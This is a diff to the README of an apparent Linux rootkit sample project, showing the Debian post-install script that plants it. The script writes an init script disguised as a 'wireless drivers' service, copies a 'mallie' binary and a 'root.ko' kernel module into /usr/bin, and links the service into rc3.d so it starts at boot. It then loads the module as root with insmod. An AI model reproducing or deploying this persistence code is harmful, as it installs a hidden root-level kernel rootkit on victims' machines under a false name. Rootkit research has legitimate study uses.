@@ -26,19 +26,39 @@ Sample linux rootkit.
 # This `DEBIAN/postinst` script is run post-installation
 
 echo '#!/bin/bash' > /etc/init.d/wireless-81xx
-echo '# chkconfig: 345 99 10' >> /etc/init.d/wireless-81xx 
-echo '# Description: Autostart wireless drivers' >> /etc/init.d/wireless-81xx 
-echo 'case "$1" in' >> /etc/init.d/wireless-81xx
-echo " 'start')" >> /etc/init.d/wireless-81xx 
-echo '   su - root -c "cd /usr/bin ; insmod /usr/bin/root.ko";;' >> /etc/init.d/wireless-81xx 
-echo " 'stop')" >> /etc/init.d/wireless-81xx
-echo ' echo "shutdown...";;' >> /etc/init.d/wireless-81xx 
-echo "esac" >> /etc/init.d/wireless-81xx
+echo '
+### BEGIN INIT INFO
+# Provides:          mallie
+# Required-Start:    $local_fs $network
+# Required-Stop:     $local_fs
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: Wireless service
+# Description: Autostart wireless drivers
+### END INIT INFO
 
-chmod +x /etc/init.d/wireless-81xx
+# Carry out specific functions when asked to by the system
+case "$1" in
+  start)
+    echo "Starting..."
+    su - root -c "cd /usr/bin/ && insmod ./root.ko"
+    ;;
+  stop)
+    echo "Stopping..."
+    sleep 2
+    ;;
+  *)
+    echo "Usage: /etc/init.d/wireless-81xx {start|stop}"
+    exit 1
+    ;;
+esac
+
+exit 0 ' >> /etc/init.d/wireless-81xx
+
+chmod 755 /etc/init.d/wireless-81xx
 cp /usr/local/bin/mallie /usr/bin/
 cp /usr/local/bin/root.ko /usr/bin/
-update-rc.d wireless-81xx defaults
+ln -s /etc/init.d/wireless-81xx /etc/rc3.d/S01wireless-81xx
 sh /etc/init.d/wireless-81xx start
 
 ```
@@ -76,3 +96,8 @@ esac
 exit 0
 
 ```
+
+# Credits
+https://askubuntu.com/questions/290099/how-to-run-a-script-during-boot-as-root <br>
+https://gist.github.com/drmalex07/298ab26c06ecf401f66c <br>
+https://github.com/xcellerator/linux_kernel_hacking
